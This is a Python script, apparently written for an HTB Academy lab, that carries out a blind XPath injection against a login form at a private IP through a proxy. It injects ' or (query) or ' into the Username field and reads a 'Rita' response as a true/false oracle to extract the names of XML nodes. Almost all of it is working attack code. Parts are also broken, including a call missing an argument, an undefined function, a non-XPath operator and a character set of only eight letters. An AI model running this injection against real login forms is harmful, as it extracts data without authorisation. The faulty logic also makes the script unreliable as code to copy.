#!/usr/bin/python3
import json,sys,requests, time
from urllib.parse import quote_plus
from tabulate import tabulate


proxies = {
    "http": "http://10.129.120.123:3128"
}

def oracle(query):
    payload = (f"' or ({query}) or '")
    print(payload)
    headers = {
        "Content-Type": "application/x-www-form-urlencoded",
    }
    data = {
        "Username": payload,
        "Password": "test"
    }
    r = requests.post(f"http://172.31.179.1/intranet.php", headers=headers, data=data, proxies=proxies)
    #print(r.text)
    return 'Rita' in r.text

'''
# confirm oracle can run
assert oracle("name(/*[1])")
assert not oracle("name(/*[2])")
'''

# Calculate the Length or Count
def dumpNumber(query):
    low = 0
    high = 127
    while low <= high:
        mid = (low+high) // 2
        if oracle(f"({query}) BETWEEN {low} AND {mid}"):
            high = mid -1
        else:
            low = mid + 1
    return low

# Dumping string
def dumpString(query, length):
    val = ""
    chars = "Employee"
    for i in range(1, length+1):
        for c in chars:
            if oracle(f"substring({query},{i},1)='{c}'"):
                val += c
                print(val)
                break
    return val


func = int(input("""HTB_ACADEMY_ORACLE
(1) Dump All Datas
Your Option : """))

if func == 0:
    test()

elif func == 1:
    
    # calc the first node
    d = 3
    count = 4
    root_name = "Employees"
    length = 1
    val = ""
    x = "/*[1]"

    # calc the struct deepth
    while 1:
        if not (oracle(f"(name({x}))")):
            print(d)
            break
        x += x
        d += 1

    # dump the root_node, testing root_name = Employees
    while 1:
        if oracle(f"string-length(name(/*[1]))={length}"):
            break
        length += 1
    root_name = dumpString(f"(name(/*[1]))")
    
    # Exfiltrating Child Nodes
    while 1:
        if oracle(f"count(/{root_name}/*)={count}"):
            break
        count += 1
    print(count)

    for i in range(3, count): # child nodes number
        length = 1
        while 1:
            if oracle(f"string-length(name(/*[1]/*[{i}]))={length}"):
                print(length)
                break
            length += 1
        child_name = dumpString(f"(name(/*[1]/*[{i}]))",length)
        print(child_name)

    # Exfiltrating Sub Child Nodes
        while 1:
            if oracle(f"count(/{root_name}/{child_name}/*)={count}"):
                break
            count += 1
        print(count)
        
        for k in range(1, count): # child nodes number
            length = 1
            while 1:
                if oracle(f"string-length(name(/*[1]/*[1]/*[{i}]))={length}"):
                    print(length)
                    break
                length += 1
            child_name = dumpString(f"(name(/*[1]/*[1]/*[{i}]))",length)
            print(child_name)
        print("------next node------")


    



